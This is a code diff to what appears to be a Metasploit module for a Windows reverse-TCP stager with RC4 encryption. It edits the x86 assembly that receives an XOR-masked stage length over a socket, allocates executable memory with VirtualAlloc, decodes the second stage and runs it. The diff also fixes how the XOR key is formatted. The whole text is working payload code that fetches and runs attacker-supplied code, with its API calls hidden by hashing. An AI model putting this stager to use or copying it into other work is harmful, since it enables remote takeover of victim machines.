@@ -74,6 +74,7 @@ module Payload::Windows::ReverseTcpRc4
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
   def asm_block_recv_rc4(opts={})
+    xorkey = Rex::Text.to_dword(opts[:xorkey]).chomp
     asm = %Q^
       ; Same as block_recv, only that the length will be XORed and the stage will be RC4 decoded.
       ; Differences to block_recv are indented two more spaces.
@@ -82,22 +83,22 @@ module Payload::Windows::ReverseTcpRc4
       ; Output: None.
       ; Clobbers: EAX, EBX, ECX, EDX, ESI, (ESP will also be modified)
       recv:
-        ; Receive the size of the incoming second stage...
-        push byte 0            ; flags
-        push byte 4            ; length = sizeof( DWORD );
+      ; Receive the size of the incoming second stage...
+        push  0x00             ; flags
+        push  0x04             ; length = sizeof( DWORD );
         push esi               ; the 4 byte buffer on the stack to hold the second stage length
         push edi               ; the saved socket
         push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
         call ebp               ; recv( s, &dwLength, 4, 0 );
-        ; Alloc a RWX buffer for the second stage
+      ; Alloc a RWX buffer for the second stage
         mov esi, [esi]         ; dereference the pointer to the second stage length
-          xor esi, "#{opts[:xorkey]}"      ; XOR the stage length
+          xor esi, #{xorkey}   ; XOR the stage length
           lea ecx, [esi+0x00]  ; ECX = stage length + S-box length (alloc length)
-        push byte 0x40         ; PAGE_EXECUTE_READWRITE
+        push  0x40         ; PAGE_EXECUTE_READWRITE
         push 0x1000            ; MEM_COMMIT
       ; push esi               ; push the newly recieved second stage length.
           push ecx             ; push the alloc length
-        push byte 0            ; NULL as we dont care where the allocation is.
+        push  0x00             ; NULL as we dont care where the allocation is.
         push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
         call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
       ; Receive the second stage and execute it...
@@ -107,7 +108,7 @@ module Payload::Windows::ReverseTcpRc4
           push esi             ; push stage length
           push eax             ; push the address of the S-box
       read_more:               ;
-        push byte 0            ; flags
+        push  0                ; flags
         push esi               ; length
         push ebx               ; the current address into our second stage's RWX buffer
         push edi               ; the saved socket
